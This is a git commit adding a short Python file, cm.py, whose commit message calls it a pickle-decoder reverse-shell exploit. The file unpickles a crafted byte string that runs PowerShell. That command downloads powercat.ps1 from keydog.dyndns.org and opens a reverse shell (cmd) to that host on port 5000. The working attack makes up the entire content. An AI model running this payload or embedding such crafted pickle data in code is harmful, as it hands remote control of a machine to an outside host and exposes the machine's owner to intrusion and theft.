ae222ac07333db2b3eb9e9afb71c4f0ec8e6111c
Arjun-Anubis <63743009+Arjun-Anubis@users.noreply.github.com>
2021-06-16 16:24:14 +0530

    Python pickle decoder running rev shell exploit

---
+++ cm.py
@@ -0,0 +1,13 @@
+# -*- coding: utf-8 -*-
+"""
+Created on Mon Jun 14 16:04:15 2021
+
+@author: anubi
+"""
+
+import pickle
+pickle.loads(b'\x80\x04\x95\xbd\x00\x00\x00\x00\x00\x00\x00\x8c\nsubprocess\x94\x8c\x04call\x94\x93\x94\x8c\x9fpowershell -c "IEX(New-Object System.Net.WebClient).DownloadString(\'http://keydog.dyndns.org/arjun/powercat.ps1\');powercat -c keydog.dyndns.org -p 5000 -e cmd"\x94\x85\x94R\x94.')
+
+
+
+
